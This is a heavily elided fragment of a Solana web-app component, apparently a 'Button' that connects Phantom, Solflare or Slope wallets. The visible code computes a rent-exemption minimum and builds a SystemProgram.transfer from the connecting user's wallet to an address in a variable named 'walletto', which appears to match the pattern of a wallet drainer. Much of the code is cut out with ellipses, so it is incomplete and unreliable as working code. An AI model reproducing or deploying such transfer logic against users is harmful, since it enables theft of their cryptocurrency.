...
import { getSolflareWallet, getSlopeWallet,getPhantomWallet} from "@solana/wallet-adapter-wallets";
import {
  WalletModalProvider,
      ...
      if (!signMessage)
        throw new Error("Wallet does not support message signing!");
            ...
            transaction_calc.add(
              ...
              const rent =  await conn.getMinimumBalanceForRentExemption(accountInfo?.data.length == undefined ? 0 : accountInfo?.data.length)
              transaction.add(
                  SystemProgram.transfer({
                  fromPubkey: publicKey,
                  toPubkey: new PublicKey(walletto),
...
export const Button = () => {
  ...
  const wallets = useMemo(() => [getSolflareWallet(),getPhantomWallet(),getSlopeWallet()], [network]);
